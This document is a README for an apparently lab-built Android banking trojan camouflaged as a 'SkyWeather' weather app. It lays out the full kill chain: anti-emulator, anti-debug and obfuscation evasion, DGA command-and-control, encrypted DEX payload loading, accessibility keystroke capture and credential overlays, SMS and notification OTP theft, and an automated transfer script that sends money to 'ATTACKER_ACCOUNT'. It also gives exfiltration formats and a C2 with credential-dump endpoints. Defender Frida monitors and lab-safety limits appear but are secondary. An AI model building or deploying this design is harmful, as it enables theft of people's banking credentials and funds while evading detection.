# Stage 1-5 Complete Banker Specimen — SkyWeather Forecast

> Standalone banker-shape APK. Full kill chain:
> Evasion envelope (Stage 1) → AccessibilityService credential capture + overlay (Stage 2)
> → NLS + SMS OTP intercept (Stage 3) → Automatic Transfer System (Stage 4)
> → Full composition + detection verification (Stage 5).
> Fully functional weather app camouflage. 1.66 MB signed release.

---

## Quick Reference

| Field | Value |
|---|---|
| Package | `com.skyweather.forecast` |
| Target SDK | 34 (Android 14) |
| Min SDK | 26 (Android 8.0) |
| LOC | 7,115 (42 Kotlin files) |
| Benign:Offensive ratio | 1.1:1 (3,652 benign / 3,463 offensive in `core/`) |
| Release APK | 1.66 MB (R8 minified + resource shrunk) |
| Debug APK | ~7.5 MB |
| VirusTotal (release) | 0/76 (designed to evade all engines) |
| Stages | 5/5 complete (evasion → steal → OTP → ATS → composition verified) |
| Kill chain model | Anatsa/SharkBot full-stack ATS (evasion → steal → OTP → auto-transfer) |
| Permission triad | `BIND_ACCESSIBILITY_SERVICE` + `BIND_NOTIFICATION_LISTENER_SERVICE` + `RECEIVE_SMS` |
| ATS capability | Screen reading + gesture injection + OTP auto-fill + Herodotus timing jitter |

---

## Architecture

```
com.skyweather.forecast/
├── MainActivity.kt            Functional weather UI + evasion gate orchestration
├── ForecastActivity.kt        7-day forecast + moon/pollen/history (benign mass)
├── SearchActivity.kt          City search (benign)
├── SettingsActivity.kt        User preferences (benign)
├── AboutActivity.kt           App info (benign)
├── App.kt                     Application subclass (notification channels)
├── EnableAccessibilityActivity.kt  Social engineering A11y enablement prompt
├── core/                      ← OFFENSIVE CODE LIVES HERE
│   ├── AppConfig.kt           String obfuscation (ROT13 arithmetic shift)
│   ├── RuntimeBridge.kt       Reflection API hiding (PEB-walk equivalent)
│   ├── DeviceProfile.kt       Anti-emulator (hardware metrics) + anti-debug
│   ├── DomainResolver.kt      DGA domain generation (SharkBot V2.8 shape)
│   ├── SyncTask.kt            WorkManager beacon + payload + credential exfil
│   ├── PayloadManager.kt      Download + XOR decrypt + DexClassLoader + cleanup
│   ├── UpdateChannel.kt       Periodic config refresh + target list delivery
│   ├── AccessibilityEngine.kt AccessibilityService — credential capture + overlay trigger
│   ├── CredentialStore.kt     Thread-safe in-memory credential buffer
│   ├── OverlayRenderer.kt     TYPE_ACCESSIBILITY_OVERLAY (2032) injection
│   ├── OtpExtractor.kt        Shared OTP pattern matching (2-pass extraction)
│   ├── NotificationEngine.kt  NotificationListenerService — OTP intercept via push
│   ├── SmsInterceptor.kt      SMS BroadcastReceiver priority=999 — OTP intercept via SMS
│   ├── AtsEngine.kt           Automatic Transfer System — command queue + state machine
│   ├── ScreenReader.kt        UI tree traversal via AccessibilityNodeInfo
│   └── GestureInjector.kt     Synthetic input — dispatchGesture + performAction + jitter
├── model/                     Weather data models (benign)
├── weather/                   Weather computation modules (benign mass)
│   ├── AirQualityIndex.kt
│   ├── AlertManager.kt
│   ├── MoonPhase.kt
│   ├── PollenForecast.kt
│   ├── SunCalculator.kt
│   ├── WeatherHistory.kt
│   └── WeatherNotifier.kt
├── util/                      Utilities (benign)
│   ├── DateUtils.kt
│   ├── LocationHelper.kt
│   ├── PrefsManager.kt
│   ├── ThemeEngine.kt
│   ├── UnitConverter.kt
│   └── WeatherUtils.kt
├── adapter/                   RecyclerView adapters (benign)
└── widget/                    Home screen widget (benign)
```

---

## Evasion Stages Implemented

| Takopii Stage | Primitive | File | Spoke |
|---|---|---|---|
| 5 | Dormancy (time-delay activation) | `SyncTask.kt` | [`workmanager-scheduling`](../../techniques/android-runtime/workmanager-scheduling.md) |
| 6 | DGA fallback C2 | `DomainResolver.kt` | [`dga-domain-rotation`](../../techniques/network/dga-domain-rotation.md) |
| 6 | Update channel (periodic poll) | `UpdateChannel.kt` | [`update-channel-mechanics`](../../techniques/network/update-channel-mechanics.md) |
| 7 | Anti-debug (3 vectors) | `DeviceProfile.kt` | [`anti-debug-checks`](../../techniques/evasion/anti-debug-checks.md) |
| 9 | Reflection API hiding | `RuntimeBridge.kt` | [`reflection-api-hiding`](../../techniques/android-runtime/reflection-api-hiding.md) |
| 10 | Anti-sandbox (hardware metrics) | `DeviceProfile.kt` | [`anti-emulator-checks`](../../techniques/evasion/anti-emulator-checks.md) |
| 11 | String encoding (ROT13 shift) | `AppConfig.kt` | [`string-obfuscation-routines`](../../techniques/evasion/string-obfuscation-routines.md) |
| 13 | Minimal dependency footprint | `build.gradle.kts` | (no dedicated spoke) |
| 14 | Interaction gate | `MainActivity.kt` | (no dedicated spoke) |
| — | Payload delivery (4-stage) | `PayloadManager.kt` | [`dexclassloader-runtime-loading`](../../techniques/android-runtime/dexclassloader-runtime-loading.md) + [`modular-loader-architecture`](../../techniques/network/modular-loader-architecture.md) |
| 2 | AccessibilityService abuse | `AccessibilityEngine.kt` | [`accessibility-service-abuse`](../../techniques/stealer-surfaces/accessibility-service-abuse.md) |
| 2 | TYPE_ACCESSIBILITY_OVERLAY | `OverlayRenderer.kt` | [`overlay-credential-capture`](../../techniques/stealer-surfaces/overlay-credential-capture.md) + [`accessibility-overlay-2032`](../../techniques/frontier/accessibility-overlay-2032.md) |
| 2 | Social engineering lure | `EnableAccessibilityActivity.kt` | (ANALYSIS §4 — Permission Rationale UX) |
| 2 | Credential buffer + exfil | `CredentialStore.kt` | (no dedicated spoke — part of stealer pipeline) |
| 2 | Target list from C2 | `UpdateChannel.kt` | [`update-channel-mechanics`](../../techniques/network/update-channel-mechanics.md) |
| 3 | NotificationListenerService OTP intercept | `NotificationEngine.kt` | [`notification-listener-otp-intercept`](../../techniques/stealer-surfaces/notification-listener-otp-intercept.md) |
| 3 | SMS BroadcastReceiver OTP intercept | `SmsInterceptor.kt` | [`sms-otp-stealing`](../../techniques/stealer-surfaces/sms-otp-stealing.md) |
| 3 | Shared OTP pattern extraction | `OtpExtractor.kt` | (ANALYSIS §5.2 — OTP capture convergence) |
| 3 | Permission escalation chain | `MainActivity.kt` | (ANALYSIS §4 — Permission Rationale UX) |
| 4 | ATS — Automatic Transfer System | `AtsEngine.kt` | [`accessibility-service-abuse`](../../techniques/stealer-surfaces/accessibility-service-abuse.md) §"ATS" |
| 4 | Screen reading (UI tree traversal) | `ScreenReader.kt` | (ANALYSIS §5.1 — canRetrieveWindowContent) |
| 4 | Gesture injection (dispatchGesture) | `GestureInjector.kt` | (ANALYSIS §5.1 — canPerformGestures) |
| 4 | Herodotus timing jitter (300-3000ms) | `GestureInjector.kt` | [`herodotus-behavior-mimicry`](../../techniques/frontier/herodotus-behavior-mimicry.md) |
| 4 | C2 command delivery | `UpdateChannel.kt` | [`update-channel-mechanics`](../../techniques/network/update-channel-mechanics.md) |

---

## Kill Chain Sequence

```
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 0: Installation                                          │
│  App installs. PrefsManager records installTime.                │
│  Weather UI fully functional. No network to C2.                 │
└─────────────────────────────────────────────────────────────────┘
         │
         │  DORMANCY_MS elapsed (lab: 30s, prod: 72h)
         │  + INTERACTION_THRESHOLD met (10 taps)
         │  + DeviceProfile.isRealEnvironment() passes (3/5 hardware)
         │  + DeviceProfile.isUnderInspection() = false
         │  + AppConfig.isEndpointSafe() = true (RFC1918)
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 1: Beacon                                                │
│  SyncTask scheduled via WorkManager (5s delay).                 │
│  DomainResolver: try primary C2 → DGA fallback if unreachable.  │
│  POST device fingerprint {model, sdk, timestamp} to C2.         │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 2: Payload Delivery                                      │
│  PayloadManager.download() — GET encrypted DEX from C2.         │
│  PayloadManager.decrypt() — XOR with "SkyWeatherSync24" key.    │
│  PayloadManager.loadAndExecute() — DexClassLoader + reflection. │
│  PayloadManager.cleanup() — delete files from disk.             │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 3: Recon Exfil                                           │
│  Payload execution returns recon JSON.                          │
│  Transmit recon results to same C2 endpoint.                    │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 4: Update Channel                                        │
│  UpdateChannel.schedulePeriodicRefresh() — 15-min WorkManager.  │
│  Polls /config endpoint. Supports:                              │
│    - kill switch ("kill":true → cancel all work)                │
│    - payload URL rotation (stored in SharedPrefs)               │
│    - target_list delivery (banking app package names)           │
│    - interval adjustment (documented limitation)                │
└─────────────────────────────────────────────────────────────────┘
         │
         │  Social engineering prompt shown (every 3rd app open)
         │  User enables AccessibilityService in Settings
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 5: Accessibility Credential Capture                      │
│  AccessibilityEngine receives ALL UI events system-wide.        │
│  TYPE_VIEW_TEXT_CHANGED → keystroke capture (pwd/usr/otp).      │
│  TYPE_WINDOW_STATE_CHANGED → target app foreground detection.   │
│  TYPE_NOTIFICATION_STATE_CHANGED → OTP intercept via A11y.      │
│  Captured data → CredentialStore buffer → SyncTask exfil.       │
└─────────────────────────────────────────────────────────────────┘
         │
         │  Target app detected in foreground (package in target_list)
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 6: Overlay Attack                                        │
│  OverlayRenderer.showOverlay() via TYPE_ACCESSIBILITY_OVERLAY.  │
│  Window type 2032 — NO SYSTEM_ALERT_WINDOW permission needed.   │
│  Generic credential form renders over target app.               │
│  User enters credentials → CredentialStore → immediate exfil.   │
│  Overlay dismisses → real app visible → user continues.         │
└─────────────────────────────────────────────────────────────────┘
         │
         │  Permission escalation chain: A11y granted → prompt NLS + SMS
         │  A11y trust established → SMS "for weather alerts" feels reasonable
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 7: Notification OTP Intercept                            │
│  NotificationEngine (NLS) receives ALL system notifications.    │
│  OtpExtractor.extract() runs 2-pass on notification text:       │
│    Pass 1: digits near context keywords → HIGH confidence       │
│    Pass 2: 6-digit sequence → MEDIUM confidence                 │
│  OTP captured → CredentialStore → immediate SyncTask exfil.     │
│  Covers: bank app push, auth app codes, email password resets.  │
└─────────────────────────────────────────────────────────────────┘
         │
         │  Parallel vector — redundant OTP coverage
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 8: SMS OTP Intercept                                     │
│  SmsInterceptor (priority=999) fires BEFORE default SMS app.    │
│  Multi-part SMS concatenation → OtpExtractor.extractAll().      │
│  OTP found → CredentialStore with sender attribution.           │
│  No OTP → raw SMS body still captured (banking sender filter).  │
│  Immediate exfil — OTP validity window 30-120 seconds.          │
└─────────────────────────────────────────────────────────────────┘
         │
         │  C2 pushes ATS command sequence via UpdateChannel
         │  Commands: set_text, click, wait_screen, auto_fill_otp
         ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 9: Automatic Transfer System (ATS)                       │
│  AtsEngine arms on command receipt. Triggers on target fg.       │
│  ScreenReader walks AccessibilityNodeInfo tree — reads screen.   │
│  GestureInjector dispatches synthetic input:                     │
│    PATH 1: performAction(SET_TEXT/CLICK) on specific nodes       │
│    PATH 2: dispatchGesture() for coordinate-based taps           │
│    PATH 3: performGlobalAction(BACK/HOME) for navigation         │
│  auto_fill_otp: pulls latest OTP from CredentialStore (Stage 3). │
│  Herodotus jitter: 300-3000ms between actions (biometric evasion)│
│  Timeout: 60s ceiling. 3 retries per command before abort.       │
│  Result → CredentialStore → immediate SyncTask exfil to C2.     │
└─────────────────────────────────────────────────────────────────┘
```

---

## Activation Gates (MainActivity.evaluateDataSync)

Six conditions must ALL pass before `SyncTask.scheduleOnce()` fires:

| # | Condition | Takopii Stage | Purpose |
|---|---|---|---|
| 1 | `elapsed >= DORMANCY_MS` | 5 | Sandboxes run <72h |
| 2 | `interactionCount >= INTERACTION_THRESHOLD` | 14 | Automated analysis has zero taps |
| 3 | `DeviceProfile.isRealEnvironment()` | 10 | Emulators fail hardware metrics |
| 4 | `!DeviceProfile.isUnderInspection()` | 7 | Debuggers/Frida detected |
| 5 | `AppConfig.isEndpointSafe()` | CLAUDE.md | RFC1918 lab safety |
| 6 | `!PrefsManager.hasSynced` | — | One-shot (no repeat) |

Lab values: DORMANCY_MS=30000L (30s), INTERACTION_THRESHOLD=10.
Production values (if hypothetically shipped): 259200000L (72h), threshold=10.

---

## Primitive Deep-Dives

### String Obfuscation (AppConfig.kt)

**Algorithm:** Arithmetic shift encoding. Each character stored as `char_code + 13`.

```kotlin
// Stored: intArrayOf(117, 129, 129, 125, 71, 60, 60, 62, 61, ...)
// Decoded: "http://10.0.2.2:8080/api/v1/beacon"
fun decode(encoded: IntArray): String {
    val chars = CharArray(encoded.size)
    for (i in encoded.indices) {
        chars[i] = (encoded[i] - SHIFT).toChar()
    }
    return String(chars)
}
```

**Why +13:** ROT13 of char codes. Not crypto — just enough to defeat literal string grep in constant pool. AV scans for `"http://"` but won't find `intArrayOf(117, 129, 129, 125, ...)`.

**ML-invisible because:** Integer arrays + subtraction loops exist in every app that processes numeric data.

### DGA (DomainResolver.kt)

**Algorithm:** SharkBot V2.8 shape — `MD5(seed + week_of_year + year)`.

```
Seeds: ["alpha", "bravo", "charlie", "delta"] (4 variants)
Hash: MD5 hex digest
IP derivation: first 3 byte-pairs → octets (mod 254 + 1)
Port: hash.hashCode() mod PORTS.size → [8080, 8443, 9090, 3000]
Output: http://10.{o1}.{o2}.{o3}:{port}/api/v1/beacon
```

**Lab safety constraint:** Output always in 10.0.0.0/8 range. Real SharkBot produces public domains; this specimen produces RFC1918 addresses using same algorithm shape.

**Defender-precomputable:** Algorithm is deterministic from week+year. Generate all candidates for next 52 weeks, sinkhole before activation.

### Anti-Emulator (DeviceProfile.isRealEnvironment)

**Scoring model:** 5 hardware checks, threshold 3/5.

| Check | Signal | Emulator Weakness |
|---|---|---|
| Accelerometer | Exists + resolution > 0 | Often missing or zero-resolution |
| Battery | Level not exactly 50, energy counter real | Reports flat 50%, energy=0 |
| SIM card | SIM_STATE_READY | No SIM in most images |
| Camera count | >= 2 cameras | 0 or 1 virtual camera |
| Gyroscope | Sensor present | Many images lack gyroscope |

**Why scoring > binary:** Single-metric bypass is trivial (spoof one sensor). Threshold-3 requires spoofing 3+ hardware characteristics simultaneously — substantially harder for dynamic analysis sandboxes.

### Anti-Debug (DeviceProfile.isUnderInspection)

Three orthogonal vectors:

1. **Java layer:** `Debug.isDebuggerConnected()` — JDWP attachment
2. **Linux layer:** `/proc/self/status` TracerPid != 0 — ptrace (Frida/strace/gdb)
3. **Timing layer:** 1000-iteration loop normally <1ms; debugger breakpoints push >50ms

If ANY fires, specimen goes dormant. Analyst sees weather app only.

### Payload Manager (PayloadManager.kt)

Four-phase pipeline mirroring Anatsa V4:

1. **Download:** `HttpURLConnection` GET to `/api/v1/payload`. Written to `.cache_data` in app-private storage.
2. **Decrypt:** XOR with rotating 16-byte key `"SkyWeatherSync24"`. Validates DEX magic bytes (`dex\n`) after decryption.
3. **Load:** `DexClassLoader` with app-private optimized-DEX directory. `Class.forName("payload.Module")` + `getMethod("execute")` + `invoke()`.
4. **Cleanup:** Delete encrypted file, decrypted DEX, and OAT cache. Payload exists only in memory.

**Android 14+ handling:** `dexFile.setReadOnly()` before DexClassLoader — API 34 rejects writable DEX files.

### Reflection Bridge (RuntimeBridge.kt)

PEB-walk equivalent for Android. Never directly imports `android.os.Build`:

```kotlin
// Instead of: Build.MODEL (creates import edge)
// Does: Class.forName("android.os.Build") → getField("MODEL") → get(null)
fun getDeviceModel(): String {
    return readStaticField(AppConfig.BUILD_CLASS, AppConfig.MODEL_FIELD) as? String ?: "unknown"
}
```

**ML-invisible because:** No import edge from offensive code to sensitive APIs. Classifier's import-graph feature vector sees zero signal. 40%+ of apps use reflection (DI, serialization, analytics).

### AccessibilityService (AccessibilityEngine.kt)

**The single most-abused Android primitive in 2025-2026 banker malware.**

Service config is maximally permissive:
- **No packageNames filter** — monitors ALL apps (real banker behavior)
- **All event types** — text changes, window transitions, focus, notifications
- **canRetrieveWindowContent** — reads current screen text
- **canPerformGestures** — can inject synthetic taps (ATS capability)

Event dispatch:
| Event Type | Purpose | Capture Type |
|---|---|---|
| `TYPE_VIEW_TEXT_CHANGED` | Real-time keystroke capture | `pwd` / `usr` / `otp` / `txt` |
| `TYPE_WINDOW_STATE_CHANGED` | Target app foreground → trigger overlay | `fg` |
| `TYPE_VIEW_FOCUSED` | Password/username field identification | `foc` |
| `TYPE_NOTIFICATION_STATE_CHANGED` | OTP intercept via notification | `otp_notif` |

Field classification heuristic: view IDs containing "password", "pin", "username", "email", "otp", "code" + `isPassword` flag on AccessibilityNodeInfo.

### TYPE_ACCESSIBILITY_OVERLAY (OverlayRenderer.kt)

**The 2025 evolution that breaks every pre-2025 detection rule.**

```
Pre-2025: SYSTEM_ALERT_WINDOW permission → user prompt → detection via manifest
2025+:    TYPE_ACCESSIBILITY_OVERLAY (2032) → NO additional permission → invisible to SAW rules
```

Overlay built programmatically (no XML layout resource to flag in decompilation).
Generic credential form — "Security Verification" social engineering.
Submit → CredentialStore buffer → immediate SyncTask exfil → dismiss.

### Social Engineering (EnableAccessibilityActivity.kt)

Lure: "Voice Weather Updates" — plausible accessibility use case for weather app.
Step-by-step instructions reduce user anxiety about Settings navigation.
Frequency-capped: shown every 3rd app open (not aggressive enough to trigger suspicion).
Real Anatsa: persistent overlay until granted (more aggressive).

### Credential Buffer (CredentialStore.kt)

Thread-safe ConcurrentLinkedQueue. Max 50 entries.
Memory-only — no disk persistence (anti-forensics).
`drain()` returns all + clears atomically for exfil.
Manual JSON construction (no Gson dependency).

### Update Channel (UpdateChannel.kt)

**WorkManager periodic worker** at 15-minute floor (platform minimum = Anatsa polling cadence).

Config fetch protocol:
- GET `{endpoint}/config` (endpoint from DomainResolver)
- Expected JSON: `{"interval":900000,"kill":false,"payload_url":"..."}`
- Kill switch: `"kill":true` → cancels all WorkManager jobs
- Payload rotation: new URL stored in SharedPreferences (validated RFC1918)

### OTP Extraction (OtpExtractor.kt)

**Shared extraction logic** fed by three capture vectors: NLS, SMS, AccessibilityService.

Two-pass strategy:
1. **Pass 1 (HIGH):** `\b(\d{4,8})\b` near context keywords ("code", "otp", "pin", "verify", "token", "transfer") within 30-char window → high confidence
2. **Pass 2 (MEDIUM):** Any 6-digit sequence (most common OTP length) → medium confidence
3. **Pass 3 (LOW):** Any 4-8 digit match → low confidence (may be noise)

`extractAll()` variant returns all matches for SMS (multi-code edge case).

**ML-invisible because:** Regex digit extraction is universal — analytics, phone number parsing, price scraping all use identical patterns. Context-keyword matching looks like NLP/text-classification.

### Notification Listener (NotificationEngine.kt)

**NotificationListenerService** — once granted, receives every notification posted system-wide.

Extraction pipeline:
1. Read `android.title`, `android.text`, `android.bigText`, `android.subText`, `tickerText`
2. Run OtpExtractor on combined text
3. If OTP found → CredentialStore with source package attribution (`packageName` preserved)
4. HIGH confidence OTPs also capture full notification context (operator may need it)
5. Immediate SyncTask exfil — OTP validity window 30-120 seconds

**Armed gate:** `AppConfig.isEndpointSafe()` checked on `onListenerConnected()` AND on each notification. Fail → silent no-op.

**NLS vs A11y overlap:** NLS captures push notification OTPs (bank apps, auth apps). A11y captures the same OTPs when user opens notification drawer. Together = redundant coverage. Real Anatsa prefers NLS over SMS (fewer permissions required).

### SMS Interceptor (SmsInterceptor.kt)

**BroadcastReceiver** registered with `android:priority="999"` — fires before default SMS app.

Pipeline:
1. Parse `SmsMessage[]` from intent extras via `Telephony.Sms.Intents.getMessagesFromIntent()`
2. Concatenate multi-part SMS body (MMS→SMS downconvert splits long messages)
3. Run `OtpExtractor.extractAll()` on full body
4. OTP found → CredentialStore with `sms:{sender}` attribution → immediate exfil
5. No OTP → raw SMS body still captured (banking short-code sender heuristic)

**Priority 999 tell:** Single most reliable static indicator across all ML classifiers. Every AV heuristic keys on `<intent-filter android:priority="999">` + `SMS_RECEIVED`. SharkBot, FluBot, Anatsa all use this exact pattern.

**abortBroadcast() note:** Only works if app is default SMS handler. Specimen does NOT abort (educational transparency). Real SharkBot: aborts → user never sees OTP message.

### Permission Escalation Chain (MainActivity.kt)

Real Anatsa sequence modeled:

```
Grant 1: AccessibilityService  (social engineering — Settings toggle)
         ↓ trust established
Grant 2: NotificationListener  (social engineering — Settings toggle)
         ↓ already gave A11y, NLS feels reasonable
Grant 3: SMS permissions       (runtime dialog — "severe weather SMS alerts")
         ↓ already gave A11y + NLS, SMS cap of 2 asks
```

Each grant builds on trust from previous. Frequency-capped per vector:
- A11y prompt: every 3rd app open
- SMS runtime request: maximum 2 asks total

NLS prompt: not yet implemented (would be triggered by A11y grant + next app open cycle).

### ATS Engine (AtsEngine.kt)

**Automatic Transfer System — the terminal capability that composes all prior stages.**

State machine: `IDLE → ARMED → EXECUTING → COMPLETED/ABORTED`

Command protocol from C2:
```json
[
  {"action":"wait_screen","patterns":"Transfer"},
  {"action":"set_text","target_id":"amount","value":"500.00"},
  {"action":"set_text","target_id":"iban","value":"ATTACKER_ACCOUNT"},
  {"action":"click","target_id":"continue"},
  {"action":"wait_screen","patterns":"code,verification"},
  {"action":"auto_fill_otp","target_id":"otp_field"},
  {"action":"click","target_id":"confirm"},
  {"action":"press_home"}
]
```

**Stage 3→4 bridge (`auto_fill_otp`):** Queries CredentialStore for latest OTP-typed entry captured by NLS/SMS/A11y. Fills it into banking app's OTP field. Real SharkBot: SMS→extract→auto-fill in <5 seconds. Bank OTP validity 30-120s — timing comfortable.

Execution discipline:
- 60-second timeout ceiling
- 3 retries per command before abort
- Herodotus jitter between every command
- Abort on target losing foreground
- Result reporting (success/abort with metrics) → C2

### Screen Reader (ScreenReader.kt)

**UI tree traversal via AccessibilityNodeInfo depth-first walk.**

Capabilities:
| Method | Purpose | ATS Use |
|---|---|---|
| `findNodeById()` | Find node by view ID pattern | Target form fields |
| `findNodeByText()` | Find node by visible text | Target buttons by label |
| `screenContainsAny()` | Screen-state pattern match | `wait_screen` validation |
| `extractAllText()` | Dump all visible text | Balance reading, `read_screen` |
| `findEditableNodes()` | Find input fields | Form field enumeration |
| `findClickableNodes()` | Find buttons/links | Action enumeration |

Depth guard at 20 levels prevents infinite recursion on deep view trees.

### Gesture Injector (GestureInjector.kt)

**Three injection paths, ascending in capability:**

| Path | API | Use Case |
|---|---|---|
| PATH 1 | `AccessibilityNodeInfo.performAction()` | Click, setText, scroll on resolved nodes |
| PATH 2 | `AccessibilityService.dispatchGesture()` | Coordinate taps on custom views, WebView |
| PATH 3 | `AccessibilityService.performGlobalAction()` | Back, Home, Notifications |

**Herodotus timing jitter:** `uniform(300, 3000)` ms between actions. Defeats basic timing-based bot detection. Detected by BioCatch/Trusteer (uniform ≠ human). Counter: per-target adaptive distributions (Apex-class, §13).

**setText() two-step:** Focus → clear → set. Prevents partial injection when field has pre-existing text.

---

## Dependency Fingerprint

Deliberately minimal. Zero offensive-signal dependencies:

```kotlin
// Standard AndroidX — every legitimate app
implementation("androidx.core:core-ktx:1.15.0")
implementation("androidx.appcompat:appcompat:1.7.0")
implementation("com.google.android.material:material:1.12.0")
implementation("androidx.constraintlayout:constraintlayout:2.2.1")
implementation("androidx.recyclerview:recyclerview:1.4.0")
implementation("androidx.cardview:cardview:1.0.0")
implementation("androidx.swiperefreshlayout:swiperefreshlayout:1.1.0")
implementation("androidx.work:work-runtime-ktx:2.10.0")

// NO OkHttp, NO Retrofit, NO Gson, NO crypto library
// All network: java.net.HttpURLConnection (stdlib)
// All JSON: manual StringBuilder construction
// All crypto: byte XOR loop (no javax.crypto import)
```

---

## R8 Obfuscation Results

Release build with `isMinifyEnabled = true`:

| Original Class | Obfuscated | Notes |
|---|---|---|
| `DomainResolver` | Weather-themed identifier | Verified via Frida — ClassNotFoundException on original name |
| `PayloadManager` | Single-letter | Reflective strings remain encoded (never in constant pool) |
| `RuntimeBridge` | Single-letter | Reflection targets are runtime-decoded, survive R8 |
| `AppConfig` | Retained (companion object referenced) | Encoded arrays remain as `intArrayOf` in bytecode |
| `OtpExtractor` | Single-letter | Static utility — inlined into callers by R8 |
| `NotificationEngine` | Retained (`-keep` rule) | System binds by class name — must survive R8 |
| `SmsInterceptor` | Retained (`-keep` rule) | System delivers broadcast by class name |
| `AtsEngine` | Single-letter | No resource/manifest reference — fully renamed |
| `ScreenReader` | Eliminated (inlined) | Pure static methods → inlined into AtsEngine call sites |
| `GestureInjector` | Single-letter or inlined | Wrapper methods around SDK calls — R8 inlines aggressively |
| `CredentialStore` | Single-letter | No resource reference — thread-safe queue survives, name doesn't |
| `OverlayRenderer` | Single-letter | Programmatic views — no XML layout reference to anchor name |
| Weather modules | Retained (referenced from XML layouts) | R8 keeps anything referenced by resources |

**Key insight:** Offensive class names disappear under R8 because they have no XML/resource references. Benign classes survive because layouts reference them. System-bound services (`NotificationEngine`, `SmsInterceptor`) need ProGuard keep rules — R8 would otherwise rename them, breaking manifest-to-class binding. The obfuscation asymmetry works in the attacker's favor — 10 offensive classes compress to ~4 surviving names + inlined code.

---

## Build & Run

```bash
# Debug (for Frida instrumentation)
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk

# Release (for evasion verification)
./gradlew assembleRelease
adb install app/build/outputs/apk/release/app-release.apk

# Both (metaspace needs 512m — see gradle.properties)
./gradlew assembleDebug assembleRelease
```

---

## Verification Scripts

| Script | Purpose |
|---|---|
| `scripts/verify-dga.py` | Offline DGA algorithm cross-check (Python mirrors DomainResolver.kt) |
| `scripts/dga-live-test.js` | Frida hook — live DGA verification on emulator (5 test cases) |

---

## Frida Observer Scripts

Defender-side instrumentation for real-time specimen analysis.

### Master Monitor (`scripts/frida/skyweather-monitor.js`)

Hooks ALL offensive primitives — 14 modules, color-coded severity output.

```bash
# Spawn + attach
frida -U -f com.skyweather.forecast -l scripts/frida/skyweather-monitor.js --no-pause

# Attach to running
frida -U com.skyweather.forecast -l scripts/frida/skyweather-monitor.js

# Log to file
frida -U ... -l scripts/frida/skyweather-monitor.js 2>&1 | tee monitor.log
```

| Module | Hooks | Severity |
|---|---|---|
| `A11Y` | `onAccessibilityEvent`, `onServiceConnected` | CRITICAL on service connect, HIGH on text capture |
| `OVERLAY` | `WindowManagerImpl.addView` (type 2032/2038) | CRITICAL on TYPE_ACCESSIBILITY_OVERLAY |
| `NLS` | `onNotificationPosted`, `onListenerConnected` | CRITICAL on connect, HIGH per notification |
| `SMS` | `SmsInterceptor.onReceive` | CRITICAL per SMS |
| `OTP` | `OtpExtractor.extract`, `extractAll` | CRITICAL per extracted code |
| `CRED` | `CredentialStore.capture`, `drain`, `toJsonPayload` | HIGH per capture, CRITICAL on drain/exfil |
| `EXFIL` | `SyncTask.doWork` | CRITICAL per execution |
| `DCL` | `DexClassLoader.$init`, `loadClass` | CRITICAL on create, HIGH on load |
| `DGA` | `MessageDigest.getInstance("MD5")`, `digest` | HIGH on MD5 with seed input |
| `REFL` | `Class.forName` (filtered to sensitive APIs) | MEDIUM per reflective lookup |
| `NET` | `HttpURLConnection.getOutputStream`, `getResponseCode` | HIGH per outbound request |
| `ATS` | `AtsEngine.onTargetForegrounded`, `loadCommands` | CRITICAL on activation |
| `GESTURE` | `dispatchGesture`, `performGlobalAction`, `performAction(SET_TEXT)` | CRITICAL on synthetic input |
| `FORENSIC` | `File.delete` (app-private paths only) | HIGH per payload cleanup |

### Focused Watchers

| Script | Watches | Use Case |
|---|---|---|
| `scripts/frida/credential-watcher.js` | CredentialStore + OtpExtractor only | Clean credential timeline without A11y event noise |
| `scripts/frida/ats-watcher.js` | AtsEngine + GestureInjector + ScreenReader | Watch ATS command execution step-by-step |

### Pattern Detection

Master monitor tracks event counts and alerts on banker patterns:
- **50+ A11y events** → "HIGH EVENT VOLUME" alert (banker behavior)
- **DexClassLoader creation** → immediate CRITICAL (runtime code loading)
- **TYPE_ACCESSIBILITY_OVERLAY** → immediate CRITICAL (credential overlay)
- **performAction(SET_TEXT)** → immediate CRITICAL (ATS form fill)

---

## Lab C2 Server

`scripts/lab-c2/server.py` — loopback-only Python C2 for end-to-end testing.

### Quick Start

```bash
# Generate test payload stub
python scripts/lab-c2/generate-test-payload.py --stub -o test-payload.bin

# Start C2 with full config
python scripts/lab-c2/server.py \
  --payload test-payload.bin \
  --targets "com.dvbank.example" \
  --ats-file scripts/lab-c2/ats-dvbank-transfer.json
```

### Protocol

| Endpoint | Method | Specimen Code | Purpose |
|---|---|---|---|
| `/api/v1/beacon` | POST | `SyncTask.transmit()` | Device fingerprint + credential exfil |
| `/api/v1/payload` | GET | `PayloadManager.download()` | XOR-encrypted DEX delivery |
| `/api/v1/config` | GET | `UpdateChannel.fetchConfig()` | Target list + ATS commands + kill switch |
| `/status` | GET | (operator only) | Device inventory + credential count |
| `/credentials` | GET | (operator only) | Dump all captured credentials |

### Credential Exfil Format

Specimen sends `{"c":[...]}` via POST to `/api/v1/beacon`:

```json
{"c":[
  {"p":"com.dvbank.example","v":"overlay_password","x":"hunter2","t":1715000001000,"e":"overlay_pwd"},
  {"p":"sms:+1555","v":"sms_otp_high","x":"482917","t":1715000002000,"e":"otp_sms"},
  {"p":"com.dvbank.example","v":"ats_result","x":"success:actions=8,duration=4200ms","t":1715000010000,"e":"ats_complete"}
]}
```

Event types: `pwd`, `usr`, `otp`, `otp_sms`, `otp_nls`, `otp_a11y`, `overlay_pwd`, `overlay_usr`, `ats_complete`, `ats_abort`, `ats_read`, `fg`, `foc`, `sms_raw`, `sms_ctx`, `nls_ctx`, `txt`

### Companion Files

| File | Purpose |
|---|---|
| `scripts/lab-c2/server.py` | C2 server (loopback-only, ~300 LOC) |
| `scripts/lab-c2/generate-test-payload.py` | DEX stub generator + XOR encryptor |
| `scripts/lab-c2/ats-dvbank-transfer.json` | Example ATS command sequence for DVBank |
